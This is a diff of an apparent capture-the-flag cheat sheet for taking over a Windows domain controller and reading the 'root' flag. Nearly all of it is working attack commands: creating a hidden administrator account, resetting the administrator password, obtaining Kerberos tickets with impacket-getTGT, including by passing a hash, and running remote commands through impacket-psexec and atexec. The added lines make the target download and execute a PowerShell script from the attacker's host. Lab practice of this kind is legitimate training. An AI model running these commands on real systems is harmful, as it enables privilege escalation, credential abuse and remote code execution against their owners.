@@ -192,10 +192,11 @@ net user myadmin 123qweasdF! /add && net localgroup Administrators myadmin /add
 
 ## GG - ROOT FLAG
 net user administrator 123qweasdF!
-U=administrator;impacket-getTGT -dc-ip $TARGET $DOM/"$U":'123qweasdF!'; export KRB5CCNAME=`pwd`/"$U".ccache; impacket-psexec -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass "cmd /c @for /d %u in (C:\\Users\\*) do @type \"%u\\Desktop\\user.txt\" 2>nul & @type \"%u\\Desktop\\root.txt\" 2>nul" | grep -vE '\[|-' | xargs -n1 | gg
+impacket-getTGT -dc-ip $TARGET $DOM/administrator:'123qweasdF!'; export KRB5CCNAME=`pwd`/administrator.ccache;
+impacket-getTGT -dc-ip $TARGET $DOM/administrator -hashes ':'; export KRB5CCNAME=`pwd`/administrator.ccache;
 
-export KRB5CCNAME=`pwd`/administrator.ccache; impacket-psexec -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass "cmd /c @for /d %u in (C:\\Users\\*) do @type \"%u\\Desktop\\user.txt\" 2>nul & @type \"%u\\Desktop\\root.txt\" 2>nul" | grep -vE '\[|-' | xargs -n1 | gg
-
+impacket-psexec -dc-ip $TARGET $DC -k -no-pass "powershell -c iex (iwr -useb http://$MYIP:8888/ROOT.ps1)" | grep -vE '\[|-' | xargs -n1 | gg
+impacket-atexec -dc-ip $TARGET $DC -k -no-pass "powershell -c iex (iwr -useb http://$MYIP:8888/ROOT.ps1)" | grep -vE '\[|-' | xargs -n1 | gg
 Get-ChildItem 'C:\Users' -Directory | ForEach-Object { Get-Content "$($_.FullName)\Desktop\user.txt","$($_.FullName)\Desktop\root.txt" -ErrorAction SilentlyContinue }
 gg ''
 
